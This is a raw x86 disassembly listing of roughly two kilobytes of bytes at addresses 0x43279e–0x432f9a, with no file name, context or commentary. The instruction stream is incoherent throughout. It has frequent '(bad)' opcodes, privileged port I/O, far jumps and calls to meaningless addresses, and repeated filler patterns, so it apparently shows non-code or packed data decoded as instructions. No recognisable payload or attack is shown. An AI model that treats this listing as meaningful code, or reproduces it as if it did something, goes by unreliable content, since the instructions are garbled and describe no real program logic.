  43279e:	add    ah,cl
  4327a0:	fdivr  st,st(0)
  4327a2:	or     eax,DWORD PTR [eax]
  4327a4:	jmp    ebp
  4327a6:	jmp    DWORD PTR [ecx-0x46007c7d]
  4327ac:	push   0x57
  4327ae:	add    ah,cl
  4327b0:	mov    edi,0x8983d71d
  4327b5:	pop    esi
  4327b6:	jmp    DWORD PTR [eax+0x0]
  4327b9:	add    bh,bh
  4327bb:	fxam   
  4327bd:	cmp    bh,bh
  4327bf:	push   DWORD PTR [esi-0x7c69d6]
  4327c5:	cmp    edi,edi
  4327c7:	mov    bl,0xff
  4327c9:	add    DWORD PTR [ebx-0x832233],0xffffffff
  4327d0:	lfence 
  4327d3:	cmp    edi,0x8
  4327d6:	(bad)  
  4327d7:	js     0x4327d8
  4327d9:	add    bh,bh
  4327db:	pop    ecx
  4327dc:	or     BYTE PTR [edx+0x0],cl
  4327df:	or     DWORD PTR [ebx+0xffed87],0xffffffc4
  4327e6:	add    BYTE PTR [edi+edi*8-0x1],al
  4327ea:	int3   
  4327eb:	xchg   esp,eax
  4327ec:	cmp    al,0x3b
  4327ee:	add    DWORD PTR [ebx+0xd6e8],0x0
  4327f5:	pushf  
  4327f6:	add    ah,bh
  4327f8:	inc    DWORD PTR [eax]
  4327fa:	(bad)  
  4327fb:	mov    edx,0x897d48
  432800:	sahf   
  432801:	mov    ds:0xf683ccad,eax
  432806:	(bad)  
  432807:	clc    
  432808:	inc    DWORD PTR [eax]
  43280a:	add    BYTE PTR [esi+0x18],ch
  43280d:	sar    edi,cl
  43280f:	dec    edx
  432811:	inc    esi
  432812:	mov    ch,0x0
  432814:	add    BYTE PTR [ebx],dh
  432816:	call   DWORD PTR [edi]
  432818:	add    DWORD PTR [eax],0xffffffff
  43281b:	add    DWORD PTR [edx],esi
  43281d:	pop    ecx
  43281e:	add    bh,bh
  432820:	sub    DWORD PTR ds:[eax+0xb70083],esp
  432827:	push   es
  432828:	add    bh,bh
  43282a:	add    BYTE PTR [ebp+eax*8-0x23376b0],ch
  432831:	pop    edi
  432832:	pop    ds
  432833:	(bad)  
  432834:	(bad)  
  432835:	fdiv   st(7),st
  432837:	adc    al,0xff
  432839:	cmp    edi,0x5e
  43283c:	push   ecx
  43283d:	into   
  43283e:	cmp    edi,0xffffff88
  432841:	jp     0x4327ed
  432843:	(bad)  
  432844:	(bad)  
  432845:	in     al,dx
  432846:	push   DWORD PTR [ecx-0x2e010000]
  43284c:	(bad)
  43284f:	add    dh,bh
  432851:	cmc    
  432852:	pop    edi
  432853:	cmp    edi,0xffffff88
  432856:	int3   
  432857:	and    al,0xff
  432859:	add    BYTE PTR [eax],al
  43285b:	push   esp
  43285c:	popa   
  43285d:	cmp    edi,0xf123e483
  432863:	(bad)  
  432864:	inc    DWORD PTR [ebp-0x7477]
  43286a:	or     DWORD PTR [ecx-0x1f],0xb
  43286e:	(bad)  
  43286f:	jmp    DWORD PTR ds:0x8983801e
  432875:	aas    
  432876:	add    BYTE PTR [edx],al
  432878:	int3   
  432879:	inc    DWORD PTR [eax]
  43287b:	inc    esi
  43287c:	xor    ch,0xff
  43287f:	mov    edx,eax
  432881:	and    ah,BYTE PTR [ebx]
  432883:	(bad)  
  432884:	call   FWORD PTR [eax-0x1]
  432887:	add    eax,0x1600ffff
  43288c:	ss arpl di,di
  43288f:	int3   
  432890:	es cmp eax,0xf283ff9e
  432896:	jmp    FWORD PTR [ecx-0x7d]
  432899:	inc    DWORD PTR [eax]
  43289b:	in     eax,dx
  43289c:	test   BYTE PTR [ecx-0x77],0x0
  4328a0:	enter  0xb32f,0xff
  4328a4:	inc    DWORD PTR [edi+edi*8-0xffff7c]
  4328ab:	ret    0x8639
  4328ae:	int3   
  4328af:	add    BYTE PTR [edx-0x7cffabc0],dl
  4328b5:	fdivr  st,st(7)
  4328b7:	push   ds
  4328b8:	add    bh,bh
  4328ba:	call   FWORD PTR [edx-0x76007e9f]
  4328c0:	push   ds
  4328c1:	or     al,0x24
  4328c3:	add    ah,cl
  4328c5:	jl     0x43284a
  4328c7:	pop    ebp
  4328c8:	add    bh,bh
  4328ca:	call   edi
  4328cc:	add    edi,DWORD PTR [eax-0x1]
  4328cf:	push   DWORD PTR [edi]
  4328d1:	repz push esi
  4328d3:	cmp    edi,0x14
  4328d6:	dec    DWORD PTR [edx+0x0]
  4328d9:	add    bh,bh
  4328db:	scas   al,BYTE PTR es:[edi]
  4328dc:	stos   BYTE PTR es:[edi],al
  4328dd:	ret    0x8383
  4328e0:	retf   
  4328e1:	adc    dl,ah
  4328e3:	(bad)  
  4328e4:	push   DWORD PTR [ebx]
  4328e6:	push   DWORD PTR [eax]
  4328e8:	(bad)  
  4328e9:	dec    esp
  4328eb:	jecxz  0x432958
  4328ed:	cdq    
  4328ee:	add    ah,cl
  4328f0:	dec    eax
  4328f1:	sbb    eax,DWORD PTR [esi+0xef0000]
  4328f7:	jns    0x4328f9
  4328f9:	mov    DWORD PTR [eax],eax
  4328fb:	sub    al,0xda
  4328fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4328fe:	add    BYTE PTR [eax],al
  432900:	scas   al,BYTE PTR es:[edi]
  432901:	xchg   esi,eax
  432902:	bound  eax,QWORD PTR [eax]
  432904:	add    BYTE PTR [edi],dh
  432906:	inc    DWORD PTR [eax]
  432908:	add    bh,bh
  43290a:	mov    edi,edi
  43290c:	inc    DWORD PTR [eax]
  43290e:	add    bh,bh
  432910:	add    BYTE PTR [esi+eiz*8+0x2c83ffff],ch
  432917:	ins    DWORD PTR es:[edi],dx
  432918:	add    BYTE PTR [eax+0xccffb6],dh
  43291e:	out    0xe,al
  432920:	int3   
  432921:	dec    edx
  432922:	jg     0x432923
  432924:	add    DWORD PTR [eax],0x4d
  432927:	xchg   edi,eax
  432928:	and    DWORD PTR [ebx+0x1d],0xffffffff
  43292c:	inc    DWORD PTR [ebx-0x34ffedcc]
  432932:	daa    
  432933:	add    bh,bh
  432935:	call   FWORD PTR [ebp+0x42]
  432938:	jmp    FWORD PTR [ecx-0xff003c]
  43293e:	dec    ecx
  43293f:	(bad)  
  432940:	inc    esp
  432942:	idiv   edi
  432944:	inc    DWORD PTR [ebx-0x15001753]
  43294a:	mov    ecx,0xdaffff00
  43294f:	popf   
  432950:	cmp    DWORD PTR [edx-0x52],0xffffffff
  432954:	int3   
  432955:	push   esi
  432957:	xor    edi,edi
  432959:	or     ebx,DWORD PTR [ecx+0x3100ff00]
  43295f:	in     eax,dx
  432960:	call   ebx
  432962:	push   eax
  432963:	inc    DWORD PTR [eax]
  432965:	xor    ebp,0xffffffc1
  432968:	cmp    DWORD PTR [ecx+0xff000d],0x5d
  43296f:	dec    eax
  432970:	add    bh,dh
  432972:	xor    al,0xff
  432974:	int3   
  432975:	int3   
  432976:	push   ebx
  432977:	inc    ebx
  432978:	jmp    DWORD PTR [eax+0x2d]
  43297b:	or     esp,0xffffffff
  43297e:	mul    DWORD PTR [edx-0x7d]
  432981:	inc    ebx
  432982:	test   BYTE PTR [eax],0xff
  432985:	(bad)  
  432986:	jp     0x432973
  432988:	mov    ebp,ebp
  43298a:	scas   eax,DWORD PTR es:[edi]
  43298b:	dec    DWORD PTR [ecx+0xa93dff]
  432991:	jg     0x432966
  432993:	(bad)  
  432994:	inc    DWORD PTR [eax]
  432996:	fs xor eax,0x892affff
  43299c:	(bad)  
  43299d:	dec    DWORD PTR [esi-0x35]
  4329a0:	add    BYTE PTR [ecx*2+0x2cffffff],ah
  4329a7:	xchg   esp,eax
  4329a8:	sub    DWORD PTR [ecx+esi*2],0xffffffff
  4329ac:	add    bh,bh
  4329ae:	call   0x13b0297f
  4329b3:	int3   
  4329b4:	(bad)  
  4329b5:	inc    DWORD PTR [edx+0x697200af]
  4329bb:	add    bh,bh
  4329bd:	add    BYTE PTR [esi],cl
  4329bf:	addr16 (bad) 
  4329c1:	in     eax,dx
  4329c2:	xor    BYTE PTR [eax],al
  4329c4:	add    BYTE PTR [ecx-0x72ff336b],cl
  4329ca:	jl     0x432998
  4329cc:	cmp    edi,0xffffff80
  4329cf:	adc    bh,bh
  4329d1:	lods   eax,DWORD PTR ds:[esi]
  4329d2:	stc    
  4329d3:	int3   
  4329d4:	inc    DWORD PTR [eax]
  4329d6:	sub    ebx,eax
  4329d8:	jmp    FWORD PTR ds:0xff89836d
  4329de:	aaa    
  4329df:	pop    edx
  4329e0:	(bad)  
  4329e1:	cld    
  4329e2:	fild   WORD PTR [eax]
  4329e4:	add    bh,bh
  4329e6:	loop   0x4329a3
  4329e8:	add    DWORD PTR [edi+0xffe4],0x38
  4329ef:	mov    bl,0x83
  4329f1:	jg     0x432a69
  4329f3:	(bad)  
  4329f4:	inc    DWORD PTR [ebx+0x18ff9f27]
  4329fa:	outs   dx,BYTE PTR ds:[esi]
  4329fb:	(bad)  
  4329fc:	inc    DWORD PTR [eax]
  4329fe:	push   es
  4329ff:	fisttp DWORD PTR [ecx-0x7a43]
  432a05:	mov    DWORD PTR [esi+ebx*2],edx
  432a08:	add    BYTE PTR [edx-0x5c],bl
  432a0b:	dec    DWORD PTR [ecx+0xeab600]
  432a11:	pusha  
  432a12:	xor    DWORD PTR [ebx-0x6aef7c01],eax
  432a18:	push   DWORD PTR [eax-0x7cc1]
  432a1e:	mov    bl,0x36
  432a20:	(bad)  
  432a21:	js     0x432a23
  432a23:	(bad)  
  432a24:	inc    DWORD PTR [eax]
  432a26:	(bad)  
  432a27:	(bad)  
  432a29:	add    DWORD PTR [ebp-0x1],edx
  432a2c:	inc    DWORD PTR [eax]
  432a2e:	push   esp
  432a2f:	inc    eax
  432a30:	add    BYTE PTR [ecx-0x7600ff96],ch
  432a36:	icebp  
  432a37:	retf   0xa600
  432a3a:	in     al,dx
  432a3b:	int3   
  432a3c:	(bad)  
  432a3d:	inc    DWORD PTR [edi]
  432a3f:	ror    esp,0x9c
  432a42:	lods   eax,DWORD PTR ds:[esi]
  432a43:	dec    DWORD PTR [ecx-0x76f8ec00]
  432a49:	mov    esi,0xffffff4f
  432a4e:	adc    al,0xa2
  432a50:	mov    DWORD PTR [esi],ebx
  432a52:	inc    ebx
  432a53:	mov    edi,edi
  432a55:	add    BYTE PTR [esp+eax*1],dh
  432a58:	cmp    edi,0xffffffff
  432a5b:	(bad)  
  432a5c:	inc    DWORD PTR [eax]
  432a5e:	inc    esi
  432a5f:	daa    
  432a60:	add    BYTE PTR [ebp+0x8],cl
  432a63:	inc    DWORD PTR [eax]
  432a65:	jmp    FWORD PTR [ebx+0x2b]
  432a68:	(bad)  
  432a69:	mov    eax,0xffcc8f
  432a6e:	jl     0x432adf
  432a70:	call   FWORD PTR [ebx-0xb]
  432a73:	inc    DWORD PTR [eax]
  432a75:	(bad)  
  432a76:	dec    BYTE PTR ds:0xffcc1000
  432a7c:	add    bh,bh
  432a7e:	fsubr  QWORD PTR [edi]
  432a80:	push   DWORD PTR [ecx+0x51]
  432a83:	cmp    edi,0xffffff83
  432a86:	cs pop esi
  432a88:	add    bl,bh
  432a8a:	fild   DWORD PTR [ebx-0x6ce17c7d]
  432a90:	push   DWORD PTR [ebx]
  432a92:	cli    
  432a93:	(bad)  
  432a94:	inc    DWORD PTR [eax]
  432a96:	icebp  
  432a97:	xor    edi,edi
  432a99:	add    BYTE PTR [ebp+0x18389cc],bh
  432a9f:	jno    0x432aa1
  432aa1:	gs into 
  432aa3:	inc    DWORD PTR [eax]
  432aa5:	dec    DWORD PTR [edx+edx*1]
  432aa8:	add    dh,al
  432aaa:	repnz inc DWORD PTR [eax]
  432aad:	adc    DWORD PTR [esi+0x196f00f8],0xffffff83
  432ab4:	add    BYTE PTR [eax],al
  432ab6:	xchg   ebp,eax
  432ab7:	in     al,dx
  432ab8:	add    BYTE PTR [edi],dh
  432aba:	dec    ecx
  432abb:	(bad)  
  432abc:	(bad)  
  432abd:	jmp    DWORD PTR [ebx+0x9]
  432ac0:	add    BYTE PTR [eax-0x7cff0090],al
  432ac6:	in     al,dx
  432ac7:	pop    esi
  432ac8:	dec    edi
  432aca:	les    ecx,FWORD PTR [ecx-0x74140001]
  432ad0:	push   DWORD PTR [eax-0x7c0008]
  432ad6:	mov    dl,0xe6
  432ad8:	call   DWORD PTR ds:0xff0058
  432ade:	xor    eax,edx
  432ae0:	jmp    esi
  432ae2:	push   es
  432ae3:	(bad)  
  432ae4:	(bad)  
  432ae5:	push   DWORD PTR [esi-0x2b9e005b]
  432aeb:	cmp    edi,0xffffffff
  432aee:	push   cs
  432aef:	(bad)  
  432af1:	adc    eax,0xcc0000fe
  432af6:	ins    DWORD PTR es:[edi],dx
  432af7:	cmp    bh,bh
  432af9:	inc    ebx
  432afa:	jo     0x432afc
  432afc:	inc    DWORD PTR [eax]
  432afe:	ret    0x8918
  432b01:	imul   edi,DWORD PTR [ecx+0x5eff00ff],0x44dfff5e
  432b0b:	add    BYTE PTR [eax],al
  432b0d:	add    BYTE PTR [eax-0x443d7c06],al
  432b13:	add    BYTE PTR [eax],al
  432b15:	call   DWORD PTR [edx]
  432b17:	xor    eax,DWORD PTR [eax]
  432b19:	push   ecx
  432b1a:	std    
  432b1b:	mov    DWORD PTR [ebx-0xd1b901],eax
  432b21:	push   cs
  432b22:	pop    ds
  432b23:	int3   
  432b24:	inc    DWORD PTR [ebx+0x30ff565e]
  432b2a:	mov    ds:0x8f8300cc,eax
  432b2f:	sub    al,0x0
  432b31:	lods   eax,DWORD PTR ds:[esi]
  432b32:	cmp    al,0x0
  432b34:	(bad)  
  432b35:	call   FWORD PTR [esi]
  432b37:	or     eax,0xff054acc
  432b3c:	dec    esp
  432b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432b3f:	push   esp
  432b40:	adc    ebp,0x20
  432b43:	add    BYTE PTR [eax],al
  432b45:	mov    DWORD PTR [esi+0x15],ecx
  432b48:	add    BYTE PTR [ebx+0x8],bl
  432b4b:	mov    DWORD PTR [ecx-0x154600],ecx
  432b51:	fimul  DWORD PTR [ebp-0x5e007700]
  432b57:	and    eax,0x83f985ff
  432b5c:	(bad)  
  432b5d:	dec    DWORD PTR [ecx]
  432b5f:	out    dx,al
  432b60:	inc    esi
  432b62:	sub    ecx,DWORD PTR [ecx+0x67a400ff]
  432b68:	(bad)  
  432b69:	mov    edx,0xcc0000fb
  432b6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432b6f:	mov    edi,0xffecab00
  432b74:	(bad)  
  432b75:	inc    DWORD PTR [eax+ebp*2-0x330d8b01]
  432b7c:	mov    esp,ecx
  432b7e:	pop    eax
  432b7f:	add    DWORD PTR [ebx+0x8911ea],0x89f3e800
  432b89:	retf   
  432b8a:	mov    bh,bh
  432b8c:	(bad)  
  432b8d:	inc    DWORD PTR [edx+0x497aff9d]
  432b93:	inc    DWORD PTR [ebx-0x764c2c01]
  432b99:	pop    esi
  432b9a:	push   cs
  432b9b:	add    BYTE PTR [eax],al
  432b9d:	int3   
  432b9e:	inc    bp
  432ba0:	add    BYTE PTR [edi],al
  432ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432ba3:	(bad)  
  432ba4:	inc    DWORD PTR [eax]
  432ba6:	adc    DWORD PTR [edx-0x7d5a00],ecx
  432bac:	cmp    edi,0xffffffae
  432baf:	arpl   di,di
  432bb1:	popa   
  432bb2:	xor    DWORD PTR [eax],eax
  432bb4:	dec    esp
  432bb6:	dec    esi
  432bb7:	mov    ah,0xff
  432bb9:	loopne 0x432b98
  432bbb:	add    BYTE PTR [ebx+0xbf1a83],al
  432bc1:	data16 out 0xff,al
  432bc4:	int3   
  432bc5:	xor    DWORD PTR [ecx+0x7ea40098],0x0
  432bcc:	add    bh,bh
  432bce:	fadd   DWORD PTR [ebp+0xb2a0cc]
  432bd4:	add    bh,bh
  432bd6:	cdq    
  432bd7:	fiadd  DWORD PTR [ebx-0x768bae]
  432bdd:	add    ah,ah
  432bdf:	rol    DWORD PTR [ebx+0x8367a8],cl
  432be5:	call   FWORD PTR [eax-0x4a]
  432be8:	jmp    FWORD PTR [edi-0x2f]
  432beb:	add    BYTE PTR [eax],al
  432bed:	int3   
  432bee:	icebp  
  432bef:	jmp    0xff89:0xff3afd00
  432bf6:	dec    BYTE PTR ds:0xff5abc00
  432bfc:	(bad)  
  432bfd:	call   edi
  432bff:	ja     0x432c00
  432c01:	jbe    0x432c01
  432c03:	inc    DWORD PTR [eax]
  432c05:	xor    DWORD PTR [ebp-0x17530050],0xffffffff
  432c0c:	inc    DWORD PTR [eax]
  432c0e:	mov    esi,0x8eb9006d
  432c13:	int3   
  432c14:	add    bh,bh
  432c16:	aas    
  432c17:	int3   
  432c18:	call   DWORD PTR [eax+0xffccee]
  432c1e:	pop    ss
  432c1f:	jecxz  0x432c20
  432c21:	cld    
  432c22:	out    dx,al
  432c23:	dec    esp
  432c25:	adc    DWORD PTR [edi+0x59],0xffffffff
  432c29:	jle    0x432bbd
  432c2b:	add    DWORD PTR [eax],0xffffffff
  432c2e:	push   ds
  432c2f:	adc    eax,DWORD PTR [eax]
  432c31:	shl    BYTE PTR [ebp-0x1],1
  432c34:	(bad)  
  432c35:	dec    DWORD PTR [ebx+0x6a89004a]
  432c3b:	(bad)  
  432c3c:	inc    DWORD PTR [eax]
  432c3e:	mov    edi,0xff72ffda
  432c43:	add    bh,bh
  432c45:	add    BYTE PTR [esi],al
  432c47:	adc    eax,0xff4d2aff
  432c4c:	int3   
  432c4d:	add    BYTE PTR [ebx-0x436f00ec],dl
  432c53:	add    ah,cl
  432c55:	add    BYTE PTR [ebx+esi*1],ch
  432c58:	int3   
  432c59:	mov    cl,0x69
  432c5b:	int3   
  432c5c:	add    bh,bh
  432c5e:	daa    
  432c5f:	jge    0x432bea
  432c61:	add    eax,0xa8
  432c66:	ret    
  432c67:	mov    ebp,0xfffb2d00
  432c6c:	cmp    edi,0x3f
  432c6f:	sub    BYTE PTR [eax],al
  432c71:	leave  
  432c72:	push   es
  432c73:	add    BYTE PTR [eax],al
  432c75:	add    BYTE PTR [edx-0x580a7c89],ah
  432c7b:	(bad)  
  432c7c:	inc    DWORD PTR [eax]
  432c7e:	inc    eax
  432c7f:	xchg   ebx,eax
  432c80:	int3   
  432c81:	int3   
  432c82:	test   al,0x0
  432c84:	(bad)  
  432c85:	jmp    FWORD PTR [esi+edi*8]
  432c88:	add    BYTE PTR [ebp-0x42],cl
  432c8b:	add    DWORD PTR [eax],0x0
  432c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432c8f:	push   ds
  432c90:	or     DWORD PTR [edx],0xffffffc1
  432c93:	add    bh,bh
  432c95:	add    BYTE PTR [edi],dh
  432c97:	pop    ecx
  432c98:	add    ch,bl
  432c9a:	lods   al,BYTE PTR ds:[esi]
  432c9b:	add    bh,bh
  432c9d:	inc    DWORD PTR [esp+ebx*4]
  432ca0:	cmp    DWORD PTR [esi],0xffffff87
  432ca3:	cmp    edi,0x0
  432ca6:	loope  0x432c81
  432ca8:	(bad)  
  432ca9:	jmp    0x432d26
  432cab:	inc    DWORD PTR [ebx-0x7cf08200]
  432cb1:	retf   0xff5e
  432cb4:	inc    DWORD PTR [eax]
  432cb6:	clc    
  432cb7:	imul   eax,DWORD PTR [eax],0x6c
  432cba:	inc    DWORD PTR [eax]
  432cbc:	(bad)  
  432cbd:	jmp    FWORD PTR [eax+0xa]
  432cc0:	push   ebp
  432cc2:	push   0xffffffff
  432cc4:	add    BYTE PTR [eax],al
  432cc6:	sbb    ebx,DWORD PTR [esi]
  432cc8:	add    BYTE PTR [ecx+0x3b],ah
  432ccb:	add    bh,bh
  432ccd:	int3   
  432cce:	mov    ch,0xac
  432cd0:	push   DWORD PTR [ebp-0x767cff8e]
  432cd6:	and    al,0x8d
  432cd8:	(bad)  
  432cd9:	in     eax,dx
  432cda:	jns    0x432cdb
  432cdc:	add    ah,cl
  432cde:	or     al,BYTE PTR [esi-0x1d2b01]
  432ce4:	cmp    edi,0xffffffdf
  432ce7:	aas    
  432ce8:	mov    DWORD PTR [edx-0x67],edx
  432ceb:	add    bh,bh
  432ced:	mov    DWORD PTR [eax],ebx
  432cef:	xchg   bh,bh
  432cf1:	and    al,0x3
  432cf3:	int3   
  432cf4:	(bad)  
  432cf5:	inc    esp
  432cf7:	push   es
  432cf8:	push   esp
  432cfa:	add    DWORD PTR [bx+si],0x0
  432cfe:	xchg   eax,ebp
  432d00:	mov    DWORD PTR [ebp-0x46],eax
  432d03:	inc    DWORD PTR [eax]
  432d05:	int3   
  432d06:	stos   DWORD PTR es:[edi],eax
  432d07:	int    0x0
  432d09:	pop    ss
  432d0a:	outs   dx,BYTE PTR ds:[esi]
  432d0b:	inc    DWORD PTR [ebx+0x1b5e00]
  432d11:	popa   
  432d12:	jbe    0x432ce0
  432d14:	inc    DWORD PTR [eax]
  432d16:	add    eax,0x70c007e
  432d1b:	int3   
  432d1c:	(bad)  
  432d1d:	(bad)  
  432d1e:	js     0x432d92
  432d20:	add    BYTE PTR [edi+0x89ff63],al
  432d26:	call   0xccff:0xe7b2ff31
  432d2d:	cmp    DWORD PTR [ecx-0x4a587cd0],0x0
  432d34:	dec    DWORD PTR [ecx+0x58ffb1d7]
  432d3a:	adc    eax,DWORD PTR [eax]
  432d3c:	cmp    edi,0xffffffb1
  432d3f:	verr   dx
  432d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432d43:	mov    esp,ecx
  432d45:	push   DWORD PTR [edi+esi*4-0x763ca701]
  432d4c:	cmp    edi,0x1d
  432d4f:	pushf  
  432d50:	add    BYTE PTR ds:0xcc000030,dh
  432d56:	add    BYTE PTR [edi-0x1],0x63
  432d5a:	fld    QWORD PTR [eax]
  432d5c:	add    bh,bh
  432d5e:	cmp    DWORD PTR [ebx-0x1],ebx
  432d61:	out    dx,al
  432d62:	add    BYTE PTR [ebx-0x394f0001],0xcc
  432d69:	jae    0x2e3a
  432d6e:	int3   
  432d6f:	inc    esi
  432d70:	sub    DWORD PTR [esi+0x54],0x0
  432d74:	int3   
  432d75:	(bad)  
  432d76:	cmp    al,0xf
  432d78:	add    cl,bl
  432d7a:	call   0xff10:0xff0000ff
  432d81:	sti    
  432d82:	dec    ecx
  432d83:	dec    DWORD PTR [ecx-0x8e7001]
  432d89:	ss jmp 0x4f102d8e
  432d8f:	mov    bh,0x0
  432d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432d93:	mov    DWORD PTR [eax],eax
  432d95:	int3   
  432d96:	je     0x432d87
  432d98:	jmp    DWORD PTR [ebx-0xffff9c]
  432d9e:	pop    ds
  432d9f:	mov    es,WORD PTR [ebx-0x6e11]
  432da5:	add    BYTE PTR [ebx-0x71],ah
  432da8:	adc    DWORD PTR [eax],0x5
  432dab:	add    BYTE PTR [ebx-0x9e2701],al
  432db1:	prefetch BYTE PTR [ebx-0x5d09007d]
  432db8:	inc    DWORD PTR [ebx-0xff10]
  432dbe:	or     BYTE PTR [edx-0x80de77],bl
  432dc4:	add    BYTE PTR [ebx-0x5eff670d],al
  432dca:	cmc    
  432dcb:	add    DWORD PTR [eax],0xffffffff
  432dce:	sub    dl,BYTE PTR [edi]
  432dd0:	add    BYTE PTR [ebx+eiz*4],cl
  432dd3:	inc    DWORD PTR [eax]
  432dd5:	adc    DWORD PTR [edi+0x7e],0xffffffff
  432dd9:	mov    ds:0xff00ccbc,eax
  432dde:	mov    dh,0x6e
  432de0:	add    BYTE PTR [esi+ebx*1],ah
  432de3:	dec    DWORD PTR [ecx-0xcef601]
  432de9:	xchg   esi,eax
  432dea:	fwait
  432deb:	inc    DWORD PTR [eax]
  432ded:	inc    DWORD PTR [eax]
  432def:	sbb    eax,0xffda64cc
  432df4:	inc    DWORD PTR [ebx-0x7c001ebc]
  432dfa:	fdivr  st,st(7)
  432dfc:	(bad)  
  432dfd:	inc    DWORD PTR [ebp-0x5a4fffd5]
  432e03:	mov    DWORD PTR [eax],eax
  432e05:	jmp    DWORD PTR [edi+ebx*1+0x3fa2cc]
  432e0c:	(bad)  
  432e0d:	push   ecx
  432e0f:	add    DWORD PTR [eax],eax
  432e11:	pop    edi
  432e12:	add    al,0x0
  432e14:	add    BYTE PTR [eax],al
  432e16:	mov    ds:0xacc4006b,al
  432e1b:	mov    edi,edi
  432e1d:	add    BYTE PTR [ecx+0x79],ah
  432e20:	call   FWORD PTR ds:0x8918
  432e26:	nop
  432e27:	sbb    al,0x0
  432e29:	cwde   
  432e2a:	adc    edi,edi
  432e2c:	add    bh,bh
  432e2e:	sbb    DWORD PTR [eax+0xb5083],edx
  432e34:	add    bh,bh
  432e36:	sbb    eax,0x37b3ffdb
  432e3b:	add    BYTE PTR [ecx-0x200b77],cl
  432e41:	adc    DWORD PTR ds:0x9e83ffff,ebp
  432e47:	mov    al,BYTE PTR [ebx+0xff8d8f]
  432e4d:	push   DWORD PTR [esi+0x7f]
  432e50:	(bad)  
  432e51:	call   FWORD PTR ds:0x8dff0089
  432e57:	jl     0x432e58
  432e59:	inc    edi
  432e5a:	xchg   esp,ecx
  432e5c:	inc    DWORD PTR [eax]
  432e5e:	cmp    eax,0x6333ff2e
  432e63:	(bad)  
  432e64:	inc    DWORD PTR [eax]
  432e66:	push   DWORD PTR [edx-0x33b80377]
  432e6c:	add    bh,bh
  432e6e:	xchg   DWORD PTR [esi],ebx
  432e70:	call   FWORD PTR [eax-0xff7c38]
  432e76:	sub    dh,BYTE PTR [edx+0x360acc]
  432e7c:	add    DWORD PTR [ebx-0x4dff4af4],0xffffff9b
  432e83:	int3   
  432e84:	cmp    edi,0x63
  432e87:	pop    eax
  432e88:	dec    DWORD PTR [edx]
  432e8a:	mov    ecx,0xea89ff00
  432e8f:	stos   DWORD PTR es:[edi],eax
  432e90:	call   FWORD PTR [edx+ebp*2]
  432e93:	(bad)  
  432e94:	inc    DWORD PTR [ebx-0x4b00fb92]
  432e9a:	mov    ecx,0xafff00ff
  432e9f:	inc    esi
  432ea0:	sub    DWORD PTR [ecx],0x30
  432ea3:	add    BYTE PTR [eax],al
  432ea5:	int3   
  432ea6:	mov    bl,0x17
  432ea8:	(bad)  
  432ea9:	(bad)  
  432eaa:	xor    DWORD PTR [eax],eax
  432eac:	add    BYTE PTR [eax],al
  432eae:	jle    0x432f27
  432eb0:	call   DWORD PTR [esi]
  432eb2:	jmp    0xffe5:0x7600ffff
  432eb9:	cmp    ecx,eax
  432ebb:	add    bh,bh
  432ebd:	add    BYTE PTR ds:0xaa01ff48,ah
  432ec3:	add    bh,bh
  432ec5:	(bad)  
  432ec6:	jp     0x432e59
  432ec8:	or     DWORD PTR [edx],0xffffffbb
  432ecb:	or     esp,0xffffff89
  432ece:	push   ss
  432ecf:	pop    esp
  432ed0:	add    BYTE PTR [edi],bl
  432ed2:	mov    al,0xcc
  432ed4:	inc    DWORD PTR [eax]
  432ed6:	shr    BYTE PTR [edi+0x0],cl
  432ed9:	in     al,dx
  432eda:	push   0xffffffff
  432edc:	add    BYTE PTR [eax],al
  432ede:	pop    eax
  432edf:	xor    eax,0xff607c00
  432ee4:	cmp    edi,0x33
  432ee7:	inc    esp
  432ee8:	inc    DWORD PTR ds:0xffff77
  432eee:	rcl    BYTE PTR [edx-0x7c955a00],1
  432ef4:	inc    DWORD PTR [eax]
  432ef6:	fcomp  QWORD PTR [edi]
  432ef8:	mov    DWORD PTR [esi+ebp*8-0x10000000],edx
  432eff:	stos   BYTE PTR es:[edi],al
  432f00:	add    BYTE PTR [ebx+0xff0046],bl
  432f06:	daa    
  432f07:	rol    BYTE PTR [eax],1
  432f09:	gs sti 
  432f0b:	add    BYTE PTR [eax],al
  432f0d:	add    DWORD PTR [ecx+0x6b],0x0
  432f11:	add    al,0xe4
  432f13:	(bad)  
  432f14:	(bad)  
  432f15:	(bad)  
  432f16:	jge    0x432f03
  432f18:	sbb    DWORD PTR [eax],0x6
  432f1b:	add    DWORD PTR [eax],0x0
  432f1e:	leave  
  432f1f:	sar    bh,0x47
  432f22:	sub    al,BYTE PTR [eax]
  432f24:	(bad)  
  432f25:	jmp    FWORD PTR [ebx+0x79]
  432f28:	xor    DWORD PTR [esi],0x48
  432f2b:	dec    DWORD PTR [ecx+0xca28ff]
  432f31:	cmp    DWORD PTR [edx-0x1],ecx
  432f34:	add    BYTE PTR [ebx+0x50ff6403],al
  432f3a:	adc    eax,0x94ff83cc
  432f3f:	xor    edi,edi
  432f41:	mov    ch,0x78
  432f43:	add    BYTE PTR [eax],al
  432f45:	dec    eax
  432f47:	pop    ds
  432f48:	(bad)  
  432f49:	jl     0x432ef7
  432f4b:	add    BYTE PTR [ecx-0xdd907d],cl
  432f51:	mov    ecx,DWORD PTR [ecx]
  432f53:	inc    DWORD PTR [ebx-0x7c235a01]
  432f59:	mov    al,ds:0x830000ea
  432f5e:	js     0x432f63
  432f60:	inc    DWORD PTR [ebp+0xcc83b1]
  432f66:	push   ss
  432f67:	ss add al,bh
  432f6a:	retf   
  432f6b:	add    bh,bh
  432f6d:	jmp    DWORD PTR [ecx-0x5e]
  432f70:	int3   
  432f71:	call   0xb726:0xffccfff8
  432f78:	(bad)  
  432f79:	jge    0x432f45
  432f7b:	inc    DWORD PTR [eax]
  432f7d:	int3   
  432f7e:	gs xchg edi,eax
  432f80:	add    ch,al
  432f82:	pop    esp
  432f83:	add    bh,bh
  432f85:	jmp    FWORD PTR [edi]
  432f87:	inc    edi
  432f88:	or     esi,0xffffffa1
  432f8b:	add    bh,bh
  432f8d:	add    BYTE PTR [edx+0x69],ah
  432f90:	push   ebx
  432f92:	loop   0x432f93
  432f94:	inc    DWORD PTR [ebx+0x20898a94]
  432f9a:	cmc    
